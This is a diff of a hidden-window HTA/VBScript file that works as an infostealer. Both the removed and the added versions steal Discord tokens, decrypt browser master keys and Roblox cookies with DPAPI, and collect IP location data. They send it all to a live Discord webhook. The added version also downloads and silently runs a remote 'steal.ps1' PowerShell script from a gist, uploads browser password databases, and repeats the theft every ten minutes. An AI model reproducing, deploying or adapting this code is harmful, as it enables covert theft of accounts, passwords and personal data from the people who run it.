@@ -1,212 +1,220 @@
 <html>
 <head><title>.</title>
-<hta:application id="a" border="none" innerborder="no" caption="no"
-    showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
+<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
 <script language="VBScript">
+window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh
+Dim sh, fso, WH, PC, USER
 Set sh = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
 
-' ── Encode VBScript string as UTF-16LE base64 for PowerShell -EncodedCommand ─
-' No temp files, no ADODB dep — uses MSXML2 bin.base64 node trick
-Function B64Encode(str)
-    Dim stm
-    Set stm = CreateObject("ADODB.Stream")
-    stm.Type    = 2
-    stm.Charset = "utf-16le"
-    stm.Open
-    stm.WriteText str
-    stm.Position = 2  ' skip UTF-16LE BOM
-    stm.Type = 1
-    Dim raw : raw = stm.Read
-    stm.Close : Set stm = Nothing
-    Dim dom, el
-    Set dom = CreateObject("MSXML2.DOMDocument")
-    Set el  = dom.createElement("b64")
-    el.dataType       = "bin.base64"
-    el.nodeTypedValue = raw
-    B64Encode = Replace(Replace(el.Text, vbLf, ""), vbCr, "")
-    Set el = Nothing : Set dom = Nothing
+' --- WEBHOOK ---
+WH = "https://discord.com/api/webhooks/1565481445034696784/kYh872fDK_3_4WHhGGdDignyh1hzsrbWA2qPbTI4fm6yja-soIqoXlUOm119LiXDGPq5"
+
+PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
+USER = sh.ExpandEnvironmentStrings("%USERNAME%")
+
+' --- Initial Grab ---
+Call GrabTokens
+Call IP
+Call GrabRoblox
+
+' --- Re-run grab chain 8x (every 10 min) ---
+Dim runCount
+For runCount = 1 To 8
+    Call PostEmbed(":repeat: Re-grab " & runCount & "/8", "PC: " & PC & " | User: " & USER, 3447003)
+    Call GrabTokens
+    Call IP
+    Call GrabRoblox
+    If runCount < 8 Then Call SleepMinutes(10)
+Next
+
+window.close()
+
+' --- IP Function ---
+Sub IP()
+    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    xh.SetOption 2, 13056
+    xh.Open "GET", "https://api.ipify.org/", False
+    xh.Send
+    If xh.Status <> 200 Then Exit Sub
+    Dim ip : ip = xh.responseText
+    If Len(ip) < 7 Then Exit Sub
+    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False
+    xh.Send
+    If xh.Status <> 200 Then Exit Sub
+    Dim ll : ll = Split(xh.responseText, vbLf)
+    Dim info : info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | " & USER
+    Call PostEmbed(":dart: Target", info, 3447003)
+    Set xh = Nothing
+End Sub
+
+' --- GrabRoblox Function ---
+Sub GrabRoblox()
+    Dim paths(2)
+    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
+    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
+    paths(2) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
+
+    Dim i, fp, raw
+    For i = 0 To 2
+        If fso.FileExists(paths(i)) Then fp = paths(i) : Exit For
+    Next
+    If Len(fp) = 0 Then Exit Sub
+    raw = ReadFile(fp)
+    If Len(raw) < 50 Then Exit Sub
+
+    Dim cookie: cookie = ""
+    If InStr(raw, "_|WARNING") > 0 Then cookie = raw
+    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
+        Dim sp: sp = InStr(raw, "CookiesData"":""")
+        If sp > 0 Then
+            sp = sp + 14
+            Dim ep: ep = InStr(sp, raw, """")
+            If ep > sp Then
+                Dim b64: b64 = Mid(raw, sp, ep - sp)
+                If Len(b64) > 100 Then cookie = DecryptDPAPI(b64)
+            End If
+        End If
+    End If
+    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
+        Dim rp: rp = InStr(raw, ".ROBLOSECURITY") : cookie = Mid(raw, rp)
+    End If
+    If Len(cookie) = 0 Then cookie = raw
+
+    cookie = Replace(cookie, vbCr, "")
+    cookie = Replace(cookie, vbLf, "")
+    cookie = Replace(cookie, vbTab, "")
+    cookie = Trim(cookie)
+    Dim sc: sc = InStr(cookie, ";")
+    If sc > 0 Then cookie = Left(cookie, sc - 1)
+    cookie = Trim(cookie)
+    Dim warn: warn = InStr(cookie, "_|WARNING")
+    If warn > 1 Then cookie = Mid(cookie, warn)
+
+    PostEmbed "Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC, 65280
+    PostFile "cookie.txt", cookie
+End Sub
+
+' --- Sleep Functions ---
+Sub SleepSeconds(s)
+    Dim cmd : cmd = "cmd /c ping -n " & (s + 1) & " 127.0.0.1 > nul"
+    sh.Run cmd, 0, True
+End Sub
+
+Sub SleepMinutes(m)
+    Call SleepSeconds(m * 60)
+End Sub
+
+' --- GrabTokens ---
+Sub GrabTokens()
+    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    xh.SetOption 2, 13056
+    xh.Open "GET", "https://gist.githubusercontent.com/alexproisgamer-dotcom/c5d82d771d84ba31d053e1459a1c138f/raw/6e952a5b205e426e7546d8c3e5a5702c180facb2/steal.ps1", False
+    xh.Send
+    If xh.Status <> 200 Then Exit Sub
+    Dim pc: pc = xh.responseText
+    If Len(pc) < 100 Then Exit Sub
+    Set xh = Nothing
+
+    Dim psf: psf = TmpFile("steal.ps1")
+    WriteFile psf, pc
+    sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
+    fso.DeleteFile psf, True
+
+    Dim tf: tf = TmpFile("steal_result.txt")
+    If Not fso.FileExists(tf) Then Exit Sub
+    Dim raw: raw = ReadFile(tf)
+
+    If Len(raw) > 10 Then
+        Dim lines: lines = Split(raw, vbCrLf)
+        Dim l
+        For Each l In lines
+            If Len(l) > 10 Then
+                If Left(l, 8) = "DISCORD|" Then
+                    Dim p: p = Split(Mid(l, 9), "|")
+                    If UBound(p) >= 4 Then
+                        Dim info: info = "**User:** " & p(0) & vbCrLf
+                        If p(1) <> "" Then info = info & "**Email:** " & p(1) & vbCrLf
+                        If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
+                        If p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
+                        info = info & "**Token:** " & p(4)
+                        Call PostEmbed(":gift: Discord Token", info, 5793266)
+                    End If
+                End If
+                If Left(l, 7) = "ROBLOX|" Or Left(l, 9) = "ROBLOXMS|" Then
+                    Call PostEmbed(":cookie: Roblox Cookie", Mid(l, 8), 65280)
+                End If
+                If Left(l, 8) = "PASSWORD" Then
+                    Dim pw: pw = Split(l, "|")
+                    If UBound(pw) >= 4 Then
+                        Call PostEmbed(":key: Password DB", "Browser: " & pw(1) & " | Status: " & pw(2) & " | b64: " & Len(pw(4)) & " chars", 16776960)
+                        If Len(pw(4)) > 0 Then Call PostFile(pw(1) & "_logindata.b64", pw(4))
+                    End If
+                End If
+            End If
+        Next
+    End If
+    fso.DeleteFile tf, True
+End Sub
+
+' --- Utility Functions ---
+Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
+Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
+Function ReadFile(path): ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
+
+' --- PostEmbed (direct to discord) ---
+Sub PostEmbed(t, d, c)
+    Dim DQ: DQ = Chr(34)
+    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
+    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    h.SetOption 2, 13056
+    h.Open "POST", WH, False
+    h.SetRequestHeader "Content-Type", "application/json"
+    h.Send j
+    Set h = Nothing
+End Sub
+
+' --- PostFile (direct to discord) ---
+Sub PostFile(fn, ct)
+    Dim DQ: DQ = Chr(34)
+    Dim b: b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
+    Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
+    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    h.SetOption 2, 13056
+    h.Open "POST", WH, False
+    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
+    h.Send bd
+    Set h = Nothing
+End Sub
+
+' --- DecryptDPAPI ---
+Function DecryptDPAPI(b64)
+    DecryptDPAPI = ""
+    Dim inf: inf = TmpFile("dpi.txt")
+    Dim outf: outf = TmpFile("dpo.txt")
+    fso.DeleteFile outf, True
+    WriteFile inf, b64
+    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
+    Dim psf: psf = TmpFile("dpapi.ps1")
+    WriteFile psf, ps
+    sh.Run "powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
+    If fso.FileExists(outf) Then If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
+    fso.DeleteFile inf, True
+    fso.DeleteFile psf, True
+    fso.DeleteFile outf, True
 End Function
 
-Sub Window_OnLoad()
-    window.resizeTo 0, 0
-    window.moveTo -2000, -2000
-
-    Dim WH : WH = "https://discord.com/api/webhooks/1565481445034696784/kYh872fDK_3_4WHhGGdDignyh1hzsrbWA2qPbTI4fm6yja-soIqoXlUOm119LiXDGPq5"
-
-    ' ── Build PowerShell payload ─────────────────────────────────────────────
-    Dim Q : Q = Chr(34)  ' double-quote shorthand
-    Dim L : L = vbLf     ' line separator shorthand
-
-    Dim ps
-    ps = "Add-Type -AssemblyName System.Security" & L
-    ps = ps & "$WH   = '" & WH & "'" & L
-    ps = ps & "$PC   = $env:COMPUTERNAME" & L
-    ps = ps & "$USER = $env:USERNAME" & L
-    ps = ps & "" & L
-
-    ' Post-Embed
-    ps = ps & "function Post-Embed($title, $desc, $color) {" & L
-    ps = ps & "    try {" & L
-    ps = ps & "        $body = @{ embeds = @(@{ title = $title; description = $desc; color = $color }) } | ConvertTo-Json -Depth 5" & L
-    ps = ps & "        Invoke-RestMethod -Uri $WH -Method Post -ContentType 'application/json' -Body $body -EA Stop" & L
-    ps = ps & "    } catch {}" & L
-    ps = ps & "}" & L
-    ps = ps & "" & L
-
-    ' Post-File
-    ps = ps & "function Post-File($name, $content) {" & L
-    ps = ps & "    try {" & L
-    ps = ps & "        $bound = [System.Guid]::NewGuid().ToString('N')" & L
-    ps = ps & "        $bytes = [System.Text.Encoding]::UTF8.GetBytes(" & L
-    ps = ps & "            " & Q & "--$bound`r`nContent-Disposition: form-data; name=`" & Q & "file`" & Q & "; filename=`" & Q & "$name`" & Q & "`r`n`r`n$content`r`n--$bound--" & Q & L
-    ps = ps & "        )" & L
-    ps = ps & "        Invoke-RestMethod -Uri $WH -Method Post -ContentType " & Q & "multipart/form-data; boundary=$bound" & Q & " -Body $bytes -EA Stop" & L
-    ps = ps & "    } catch {}" & L
-    ps = ps & "}" & L
-    ps = ps & "" & L
-
-    ' Get-IP
-    ps = ps & "function Get-IP {" & L
-    ps = ps & "    try {" & L
-    ps = ps & "        $ip  = (Invoke-RestMethod 'https://api.ipify.org/' -UseBasicParsing).Trim()" & L
-    ps = ps & "        $raw = (Invoke-WebRequest " & Q & "http://ip-api.com/line/$ip`?fields=country,regionName,city,isp" & Q & " -UseBasicParsing).Content" & L
-    ps = ps & "        $ll  = ($raw -split " & Q & "`n" & Q & ") | ForEach-Object { $_.Trim() }" & L
-    ps = ps & "        Post-Embed 'Target' " & Q & "IP: $ip | $($ll[0]) | $($ll[1]) | $($ll[2]) | ISP: $($ll[3]) | PC: $PC | USER: $USER" & Q & " 3447003" & L
-    ps = ps & "    } catch {}" & L
-    ps = ps & "}" & L
-    ps = ps & "" & L
-
-    ' Get-MK
-    ps = ps & "function Get-MK($base) {" & L
-    ps = ps & "    try {" & L
-    ps = ps & "        $ls = Join-Path $base 'Local State'" & L
-    ps = ps & "        if (-not (Test-Path $ls)) { return $null }" & L
-    ps = ps & "        $j  = [System.IO.File]::ReadAllText($ls) | ConvertFrom-Json" & L
-    ps = ps & "        $ek = [Convert]::FromBase64String($j.os_crypt.encrypted_key)" & L
-    ps = ps & "        return [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]$ek[5..($ek.Length-1)], $null, 'CurrentUser')" & L
-    ps = ps & "    } catch { return $null }" & L
-    ps = ps & "}" & L
-    ps = ps & "" & L
-
-    ' Dec-GCM — .NET 8+ and pre-8 compat
-    ps = ps & "function Dec-GCM($mk, $b) {" & L
-    ps = ps & "    if (-not $mk -or $b.Length -lt 31) { return $null }" & L
-    ps = ps & "    try {" & L
-    ps = ps & "        $nonce = [byte[]]$b[3..14]" & L
-    ps = ps & "        $tag   = [byte[]]$b[($b.Length-16)..($b.Length-1)]" & L
-    ps = ps & "        $ct    = [byte[]]$b[15..($b.Length-17)]" & L
-    ps = ps & "        $out   = New-Object byte[] $ct.Length" & L
-    ps = ps & "        try   { $gcm = [System.Security.Cryptography.AesGcm]::new([byte[]]$mk, 16) }" & L
-    ps = ps & "        catch { $gcm = [System.Security.Cryptography.AesGcm]::new([byte[]]$mk) }" & L
-    ps = ps & "        $gcm.Decrypt($nonce, $ct, $tag, $out)" & L
-    ps = ps & "        $gcm.Dispose()" & L
-    ps = ps & "        return [System.Text.Encoding]::UTF8.GetString($out)" & L
-    ps = ps & "    } catch { return $null }" & L
-    ps = ps & "}" & L
-    ps = ps & "" & L
-
-    ' Valid-Token
-    ps = ps & "function Valid-Token($t) {" & L
-    ps = ps & "    if (-not $t) { return $false }" & L
-    ps = ps & "    if ($t -match '^mfa\.[\w-]{84}$')                      { return $true }" & L
-    ps = ps & "    if ($t -match '^[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,}$') { return $true }" & L
-    ps = ps & "    return $false" & L
-    ps = ps & "}" & L
-    ps = ps & "" & L
-
-    ' Check-Token
-    ps = ps & "function Check-Token($t) {" & L
-    ps = ps & "    try {" & L
-    ps = ps & "        $wc = New-Object System.Net.WebClient" & L
-    ps = ps & "        $wc.Headers.Add('Authorization', $t)" & L
-    ps = ps & "        $wc.Headers.Add('Content-Type', 'application/json')" & L
-    ps = ps & "        $r = $wc.DownloadString('https://discord.com/api/v9/users/@me')" & L
-    ps = ps & "        $wc.Dispose()" & L
-    ps = ps & "        return $r -match '""id""'" & L
-    ps = ps & "    } catch { return $false }" & L
-    ps = ps & "}" & L
-    ps = ps & "" & L
-
-    ' Scan-File
-    ps = ps & "function Scan-File($path, $mk) {" & L
-    ps = ps & "    try {" & L
-    ps = ps & "        $bytes = [System.IO.File]::ReadAllBytes($path)" & L
-    ps = ps & "        $txt   = [System.Text.Encoding]::GetEncoding(28591).GetString($bytes)" & L
-    ps = ps & "        foreach ($m in ([regex]'dQw4w9WgXcQ:[A-Za-z0-9+/]{10,}={0,2}').Matches($txt)) {" & L
-    ps = ps & "            try {" & L
-    ps = ps & "                $enc = [Convert]::FromBase64String($m.Value.Substring(12))" & L
-    ps = ps & "                $dec = Dec-GCM $mk $enc" & L
-    ps = ps & "                if ((Valid-Token $dec) -and (Check-Token $dec)) { return $dec }" & L
-    ps = ps & "            } catch {}" & L
-    ps = ps & "        }" & L
-    ps = ps & "        foreach ($m in ([regex]'[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,}').Matches($txt)) {" & L
-    ps = ps & "            if ((Valid-Token $m.Value) -and (Check-Token $m.Value)) { return $m.Value }" & L
-    ps = ps & "        }" & L
-    ps = ps & "        $m3 = ([regex]'mfa\.[\w-]{84}').Match($txt)" & L
-    ps = ps & "        if ($m3.Success -and (Check-Token $m3.Value)) { return $m3.Value }" & L
-    ps = ps & "    } catch {}" & L
-    ps = ps & "    return $null" & L
-    ps = ps & "}" & L
-    ps = ps & "" & L
-
-    ' Scan-Dir
-    ps = ps & "function Scan-Dir($ldb, $mk) {" & L
-    ps = ps & "    if (-not (Test-Path $ldb)) { return $null }" & L
-    ps = ps & "    $files = Get-ChildItem $ldb -File -EA SilentlyContinue |" & L
-    ps = ps & "             Where-Object { $_.Extension -in '.ldb','.log' } |" & L
-    ps = ps & "             Sort-Object LastWriteTime -Descending" & L
-    ps = ps & "    foreach ($file in $files) {" & L
-    ps = ps & "        $t = Scan-File $file.FullName $mk" & L
-    ps = ps & "        if ($t) { return $t }" & L
-    ps = ps & "    }" & L
-    ps = ps & "    return $null" & L
-    ps = ps & "}" & L
-    ps = ps & "" & L
-
-    ' Get-Token
-    ps = ps & "function Get-Token {" & L
-    ps = ps & "    $token = $null" & L
-    ps = ps & "    foreach ($app in @('discord','discordcanary','discordptb','discorddevelopment')) {" & L
-    ps = ps & "        if ($token) { break }" & L
-    ps = ps & "        $base = Join-Path $env:APPDATA $app" & L
-    ps = ps & "        if (-not (Test-Path $base)) { continue }" & L
-    ps = ps & "        $mk = Get-MK $base" & L
-    ps = ps & "        $t  = Scan-Dir (Join-Path $base 'Local Storage\leveldb') $mk" & L
-    ps = ps & "        if ($t) { $token = $t }" & L
-    ps = ps & "    }" & L
-    ps = ps & "    if (-not $token) {" & L
-    ps = ps & "        $browsers = @(" & L
-    ps = ps & "            (Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data')," & L
-    ps = ps & "            (Join-Path $env:LOCALAPPDATA 'Microsoft\Edge\User Data')," & L
-    ps = ps & "            (Join-Path $env:LOCALAPPDATA 'BraveSoftware\Brave-Browser\User Data')," & L
-    ps = ps & "            (Join-Path $env:LOCALAPPDATA 'Opera Software\Opera Stable')," & L
-    ps = ps & "            (Join-Path $env:LOCALAPPDATA 'Vivaldi\User Data')" & L
-    ps = ps & "        )" & L
-    ps = ps & "        foreach ($br in $browsers) {" & L
-    ps = ps & "            if ($token) { break }" & L
-    ps = ps & "            if (-not (Test-Path $br)) { continue }" & L
-    ps = ps & "            $mk    = Get-MK $br" & L
-    ps = ps & "            $profs = @('Default') + @(Get-ChildItem $br -Directory -Filter 'Profile *' -EA SilentlyContinue | Select-Object -ExpandProperty Name)" & L
-    ps = ps & "            foreach ($p in $profs) {" & L
-    ps = ps & "                if ($token) { break }" & L
-    ps = ps & "                $t = Scan-Dir (Join-Path $br " & Q & "$p\Local Storage\leveldb" & Q & ") $mk" & L
-    ps = ps & "                if ($t) { $token = $t }" & L
-    ps = ps & "            }" & L
-    ps = ps & "        }" & L
-    ps = ps & "    }" & L
-    ps = ps & "    return $token" & L
-    ps = ps & "}" & L
-    ps = ps & "" & L
-    ps = ps & "Get-IP" & L
-    ps = ps & "$tok = Get-Token" & L
-    ps = ps & "if ($tok) { Post-File 'discord_token.txt' $tok }"
-
-    ' ── Encode and launch — no temp files ───────────────────────────────────
-    Dim enc : enc = B64Encode(ps)
-    sh.Run "powershell -NoP -NonI -W Hidden -EncodedCommand " & enc, 0, False
-End Sub
+' --- Ej ---
+Function Ej(s)
+    Ej = s
+    Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
+    Ej = Replace(Ej, Chr(34), Chr(92) & Chr(34))
+    Ej = Replace(Ej, vbCrLf, Chr(92) & "n")
+    Ej = Replace(Ej, vbCr, Chr(92) & "n")
+    Ej = Replace(Ej, vbLf, Chr(92) & "n")
+    Ej = Replace(Ej, vbTab, Chr(92) & "t")
+End Function
 </script>
 </head><body></body></html>
